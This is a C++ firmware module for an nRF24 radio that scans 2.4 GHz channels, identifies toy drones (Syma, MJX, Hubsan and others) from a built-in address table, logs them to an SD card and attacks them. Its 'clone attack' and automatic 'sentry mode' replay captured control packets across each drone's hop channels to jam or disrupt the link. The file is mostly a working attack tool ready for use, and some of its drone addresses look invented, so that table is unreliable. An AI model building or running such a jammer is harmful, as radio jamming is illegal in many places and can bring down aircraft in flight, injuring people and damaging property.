#include "nrf_radar.h"
#include <RF24.h>
#include "nrf_common.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>
#include <vector>
#include "SD.h"
#include "FS.h"

// ======================================================================================
// CONFIGURATION & DATABASE
// ======================================================================================

#define LOG_FILENAME "/radar_dron_nrf.txt"

struct DroneProfile {
    const char* name;
    uint64_t    bind_id;
    uint8_t     freq_channels[4];
    rf24_datarate_e dataRate;
};

const DroneProfile DRONE_DB[] = {
    {"SYMA X5/X8",       0xA202020202ULL,   {10, 34, 58, 72}, RF24_250KBPS},
    {"SYMA X5C-1",       0x53594D415831ULL, {10, 30, 55, 75}, RF24_250KBPS},
    {"SYMA X5SW",        0x53594D415357ULL, {12, 32, 56, 76}, RF24_250KBPS},
    {"SYMA X5UW",        0x53594D415557ULL, {11, 33, 57, 77}, RF24_250KBPS},
    {"BAYANG/E010",      0x1223344556ULL,   {0, 20, 40, 60},  RF24_1MBPS},
    {"EACHINE H8",       0xBA11BA11BAULL,   {5, 25, 45, 65},  RF24_1MBPS},
    {"MJX BUGS 3",       0x6D6D6D6D6DULL,   {30, 50, 70, 80}, RF24_1MBPS},
    {"MJX BUGS 5W",      0x6D6D6D6D35ULL,   {28, 48, 68, 88}, RF24_1MBPS},
    {"WLTOYS V202",      0x6688686868ULL,   {14, 30, 46, 62}, RF24_250KBPS},
    {"HUBSAN H107",      0xE7E7E7E7E7ULL,   {5, 20, 45, 70},  RF24_250KBPS},
    {"GENERIC 1MBPS",    0xE7E7E7E7E7ULL,   {10, 30, 50, 70}, RF24_1MBPS}
};
const int DB_SIZE = sizeof(DRONE_DB) / sizeof(DRONE_DB[0]);

struct DetectedDrone {
    String name;
    uint64_t addr;
    int primaryChannel;
    uint8_t hopChannels[4];
    uint32_t hits;
    unsigned long lastSeen;
    unsigned long lastLogTime;
    unsigned long lastAttackTime;
    uint8_t payload[32];
    rf24_datarate_e rate;
    int signalQuality;
};

std::vector<DetectedDrone> radarDrones;
int radarLastHotChannel = -1;
bool radarIsLocked = false;
int radarLockedDbIdx = -1;
unsigned long radarLastLockHit = 0;
bool sentryMode = false;
int currentDisplayChannel = 0; // Do wyświetlania w UI

// ======================================================================================
// RADIO CONTROL
// ======================================================================================

// Funkcja przywracająca radio do trybu skanera (ważne po ataku!)
void reset_radio() {
    NRFradio.stopListening();
    NRFradio.setAddressWidth(5);
    NRFradio.setCRCLength(RF24_CRC_DISABLED); // KLUCZOWE dla skanera
    NRFradio.setAutoAck(false);               // KLUCZOWE dla skanera
    NRFradio.setPayloadSize(32);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setDataRate(RF24_1MBPS);
    NRFradio.startListening();
}

void fire_jammer(DetectedDrone& target); // Forward

// ======================================================================================
// LOGIC
// ======================================================================================

void logToSD(DetectedDrone &d) {
    if (millis() - d.lastLogTime < 10000) return;

    File file = SD.open(LOG_FILENAME, FILE_APPEND);
    if (!file) {
        file = SD.open(LOG_FILENAME, FILE_WRITE);
        if (!file) return;
    }

    String logLine = "[" + String(millis()/1000) + "s] " + d.name + " | Ch:" + String(d.primaryChannel);
    file.println(logLine);
    file.close();
    d.lastLogTime = millis();
    tft.drawPixel(tftWidth-1, tftHeight-1, TFT_GREEN);
}

bool radarIsValidPacket(uint8_t* buf) {
    uint32_t sum = 0;
    for(int i=0; i<32; i++) sum += buf[i];
    return (sum > 0 && sum < (32 * 255));
}

void radar_update_list(int dbIdx, int ch, uint8_t* data) {
    const DroneProfile& p = DRONE_DB[dbIdx];
    for (auto& d : radarDrones) {
        if (d.name == String(p.name)) {
            d.lastSeen = millis();
            d.primaryChannel = ch;
            d.hits++;
            if(d.signalQuality < 100) d.signalQuality += 10;
            memcpy(d.payload, data, 32);

            logToSD(d);

            // SENTRY MODE: Atakuj jeśli minęło 8 sekund od ostatniego ataku
            if (sentryMode && (millis() - d.lastAttackTime > 8000)) {
                fire_jammer(d);
                d.lastAttackTime = millis();
                reset_radio(); // Przywróć nasłuch po ataku
            }
            return;
        }
    }

    if (radarDrones.size() >= 5) radarDrones.erase(radarDrones.begin());

    DetectedDrone newD;
    newD.name = String(p.name);
    newD.addr = p.bind_id;
    newD.primaryChannel = ch;
    newD.rate = p.dataRate;
    memcpy(newD.hopChannels, p.freq_channels, 4);
    newD.hits = 1;
    newD.lastSeen = millis();
    newD.lastLogTime = 0;
    newD.lastAttackTime = 0;
    newD.signalQuality = 50;
    memcpy(newD.payload, data, 32);

    radarDrones.push_back(newD);
    logToSD(radarDrones.back());

    if (sentryMode) {
        fire_jammer(radarDrones.back());
        radarDrones.back().lastAttackTime = millis();
        reset_radio();
    }
}

bool verify_pattern(const DroneProfile& p, int current_ch_idx) {
    int next_ch = p.freq_channels[(current_ch_idx + 1) % 4];
    NRFradio.stopListening();
    NRFradio.setChannel(next_ch);
    NRFradio.startListening();

    unsigned long start_verify = millis();
    while (millis() - start_verify < 35) { // Trochę szybciej
        if (NRFradio.available()) return true;
    }
    return false;
}

void radar_scan_step() {
    static int scanCh = 0;
    if (radarIsLocked) return;

    NRFradio.setChannel(scanCh);
    NRFradio.startListening();
    delayMicroseconds(130);

    radarLastHotChannel = scanCh;
    currentDisplayChannel = scanCh; // Do UI

    scanCh++;
    if (scanCh > 85) scanCh = 0;
}

void radar_check_protocol() {
    if (radarIsLocked || radarLastHotChannel == -1) return;

    for (int i = 0; i < DB_SIZE; i++) {
        const DroneProfile& p = DRONE_DB[i];
        int ch_index = -1;
        for(int c=0; c<4; c++) {
            if(p.freq_channels[c] == radarLastHotChannel) {
                ch_index = c;
                break;
            }
        }

        if(ch_index != -1) {
            NRFradio.stopListening();
            NRFradio.setDataRate(p.dataRate);
            NRFradio.setChannel(radarLastHotChannel);
            NRFradio.openReadingPipe(1, p.bind_id);
            NRFradio.startListening();

            unsigned long st = millis();
            uint8_t tmp[32];

            while(millis() - st < 12) { // Skrócone okno
                if (NRFradio.available()) {
                    NRFradio.read(tmp, 32);
                    if (radarIsValidPacket(tmp)) {
                        if (verify_pattern(p, ch_index)) {
                            radar_update_list(i, radarLastHotChannel, tmp);
                            radarIsLocked = true;
                            radarLockedDbIdx = i;
                            radarLastLockHit = millis();
                            radarLastHotChannel = -1;
                            return;
                        }
                    }
                }
            }
        }
    }
    radarLastHotChannel = -1;
}

void radar_track_target() {
    if (!radarIsLocked || radarLockedDbIdx == -1) return;

    const DroneProfile& p = DRONE_DB[radarLockedDbIdx];
    static int hIdx = 0;
    int ch = p.freq_channels[hIdx];

    NRFradio.stopListening();
    NRFradio.setDataRate(p.dataRate);
    NRFradio.setChannel(ch);
    NRFradio.openReadingPipe(1, p.bind_id);
    NRFradio.startListening();

    uint8_t tmp[32];
    unsigned long checkStart = millis();
    bool packetReceived = false;

    while(millis() - checkStart < 5) {
        if (NRFradio.available()) {
            NRFradio.read(tmp, 32);
            if(radarIsValidPacket(tmp)) {
                radarLastLockHit = millis();
                radar_update_list(radarLockedDbIdx, ch, tmp);
                packetReceived = true;
            }
        }
    }

    if(!packetReceived) {
        for(auto& d : radarDrones) {
            if(d.name == String(p.name) && d.signalQuality > 0) d.signalQuality--;
        }
    }

    hIdx = (hIdx + 1) % 4;

    if (millis() - radarLastLockHit > 2500) {
        radarIsLocked = false;
        radarLockedDbIdx = -1;
        reset_radio(); // Ważny reset po zgubieniu celu
    }
}

// ======================================================================================
// JAMMER
// ======================================================================================

void fire_jammer(DetectedDrone& target) {
    tft.fillScreen(TFT_RED);
    tft.setTextColor(TFT_WHITE, TFT_RED);
    drawMainBorder();

    tft.setCursor(20, 60); tft.setTextSize(FM);
    tft.print(sentryMode ? "SENTRY DEFENSE!" : "CLONE ATTACK!");

    tft.setTextSize(1);
    tft.setCursor(40, 90);
    tft.print(target.name);

    NRFradio.stopListening();
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setDataRate(target.rate);
    NRFradio.setAutoAck(false);
    NRFradio.openWritingPipe(target.addr);

    unsigned long startJam = millis();
    unsigned long duration = sentryMode ? 5000 : 10000;

    while(millis() - startJam < duration) {
        if(check(SelPress)) break;

        for(int i=0; i<4; i++) {
            NRFradio.setChannel(target.hopChannels[i]);
            NRFradio.writeFast(target.payload, 32);
            delayMicroseconds(500);
        }

        if(millis() % 200 < 50) tft.fillCircle(tftWidth - 30, 40, 10, TFT_WHITE);
        else tft.fillCircle(tftWidth - 30, 40, 10, TFT_RED);
    }

    // NIE WŁĄCZAMY TU AUTOACK! Radar potrzebuje AutoAck = false.
    // Radio zostanie zresetowane w głównej pętli przez reset_radio().
}

// ======================================================================================
// MAIN LOOP
// ======================================================================================

// ======================================================================================
// MAIN LOOP & UI (POPRAWIONA NAWIGACJA WSTECZNA)
// ======================================================================================

void nrf_drone_radar() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) { displayError("NRF24 Not Found"); return; }

    reset_radio();

    radarDrones.clear();
    radarIsLocked = false;
    radarLastHotChannel = -1;
    sentryMode = false;

    bool dnaView = false;
    int selectedIdx = 0;
    unsigned long lastDraw = 0;

    drawMainBorder();

    // ZMIANA 1: Pętla nieskończona, wyjście obsługujemy ręcznie w środku
    while (true) {

        // --- OBSŁUGA PRZYCISKU WSTECZ (ESC) ---
        if (check(EscPress)) {
            if (dnaView) {
                // Jeśli jesteśmy w Fox Hunt -> Wróć do listy
                dnaView = false;
                tft.fillScreen(bruceConfig.bgColor); // Wyczyść ekran
                drawMainBorder();
                delay(200); // Debounce
            } else {
                // Jeśli jesteśmy na liście -> Wyjdź z programu
                break;
            }
        }
        // ---------------------------------------

        if (CHECK_NRF_SPI(mode)) {
            if (radarIsLocked) radar_track_target();
            else { radar_scan_step(); radar_check_protocol(); }
        }

        // --- NAVIGATION ---
        int listSize = radarDrones.size() + 1;

        if (check(NextPress)) {
            if (!dnaView) {
                selectedIdx++;
                if (selectedIdx >= listSize) selectedIdx = 0;
            }
        }
        if (check(PrevPress)) {
            if (!dnaView) {
                selectedIdx--;
                if (selectedIdx < 0) selectedIdx = listSize - 1;
            }
        }

        if (check(SelPress)) {
            if(dnaView) {
                // MANUAL ATTACK (Wewnątrz DNA)
                if (!radarDrones.empty()) {
                    // Index korekta: -1 bo 0 to Sentry
                    if (selectedIdx > 0) {
                        DetectedDrone& target = radarDrones[selectedIdx - 1];
                        fire_jammer(target);
                        target.lastAttackTime = millis();

                        tft.fillScreen(bruceConfig.bgColor);
                        drawMainBorder();
                        radarIsLocked = false;
                        reset_radio();
                        dnaView = false; // Po ataku wróć do listy
                    }
                }
            } else {
                // LIST MODE
                if (selectedIdx == 0) {
                    sentryMode = !sentryMode;
                } else {
                    dnaView = true;
                    tft.fillScreen(bruceConfig.bgColor);
                    drawMainBorder();
                }
            }
            delay(200);
        }

        // --- DRAWING ---
        if (millis() - lastDraw > 100) {
            unsigned long now = millis();

            // Cleanup (1 minuta)
            if (now % 1000 == 0) {
                 for (int i = radarDrones.size() - 1; i >= 0; i--) {
                    if (now - radarDrones[i].lastSeen > 60000) {
                        radarDrones.erase(radarDrones.begin() + i);
                        if(selectedIdx >= (int)radarDrones.size() + 1) selectedIdx = 0;
                    }
                }
            }

            // === VIEW: DNA DECODER ===
            if (dnaView && selectedIdx > 0) {
                DetectedDrone& d = radarDrones[selectedIdx - 1];

                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.setCursor(10, 35); tft.setTextSize(FM);
                tft.print("FOX HUNT ANALYZER");

                // Signal Bar
                tft.drawRect(10, 60, 200, 15, TFT_WHITE);
                int barW = map(d.signalQuality, 0, 100, 0, 198);
                uint16_t barColor = (d.signalQuality > 70) ? TFT_GREEN : (d.signalQuality > 30) ? TFT_YELLOW : TFT_RED;
                tft.fillRect(11, 61, barW, 13, barColor);
                tft.fillRect(11 + barW, 61, 198 - barW, 13, bruceConfig.bgColor);

                tft.setTextSize(1);
                tft.setCursor(220, 63);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.printf("%d%%", d.signalQuality);

                tft.setCursor(10, 85); tft.printf("NAME: %s", d.name.c_str());
                tft.setCursor(10, 100); tft.printf("ADDR: 0x%010llX", d.addr);

                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                for (int i = 0; i < 16; i++) {
                    int xPos = 12 + ((i%8) * 28);
                    int yPos = 120 + ((i/8) * 20);
                    tft.setCursor(xPos, yPos);
                    tft.printf("%02X", d.payload[i]);
                }

                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.setCursor(10, tftHeight - 20);
                tft.print("[BTN] ATTACK   [ESC] BACK");
            }
            // === VIEW: LIST ===
            else {
                tft.setCursor(10, 35); tft.setTextSize(FM);
                tft.fillRect(10, 35, tftWidth-20, 20, bruceConfig.bgColor);

                if(sentryMode) {
                    tft.setTextColor(TFT_ORANGE, bruceConfig.bgColor);
                    tft.print("SENTRY MODE ACTIVE");
                } else if (radarIsLocked) {
                    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
                    tft.print("TARGET LOCKED!");
                } else {
                    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                    tft.printf("SCAN: %d MHz", 2400 + currentDisplayChannel);
                }

                int yStart = 65;
                int itemH = 26;

                // Sentry Button
                if(selectedIdx == 0) {
                    tft.fillRoundRect(5, yStart, tftWidth-10, itemH, 4, TFT_ORANGE);
                    tft.setTextColor(TFT_BLACK, TFT_ORANGE);
                } else {
                    tft.drawRoundRect(5, yStart, tftWidth-10, itemH, 4, TFT_ORANGE);
                    tft.fillRoundRect(6, yStart+1, tftWidth-12, itemH-2, 4, bruceConfig.bgColor);
                    tft.setTextColor(TFT_ORANGE, bruceConfig.bgColor);
                }
                tft.setTextSize(1);
                tft.setCursor(20, yStart + 6);
                tft.printf("SENTRY MODE: %s", sentryMode ? "ON" : "OFF");

                // Drones List
                for(int i=0; i<min((int)radarDrones.size(), 4); i++) {
                    DetectedDrone& d = radarDrones[i];
                    int y = yStart + ((i + 1) * (itemH + 4));

                    if((i + 1) == selectedIdx) {
                        tft.fillRoundRect(5, y, tftWidth-10, itemH, 4, bruceConfig.priColor);
                        tft.setTextColor(bruceConfig.bgColor, bruceConfig.priColor);
                    } else {
                        tft.drawRoundRect(5, y, tftWidth-10, itemH, 4, bruceConfig.priColor);
                        tft.fillRoundRect(6, y+1, tftWidth-12, itemH-2, 4, bruceConfig.bgColor);
                        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                    }

                    tft.setCursor(12, y + 6);
                    tft.print(d.name);
                    tft.setCursor(tftWidth - 50, y + 6);
                    tft.printf("CH:%d", d.primaryChannel);
                }
            }
            lastDraw = millis();
        }
    }
    if (CHECK_NRF_SPI(mode)) NRFradio.stopListening();
}
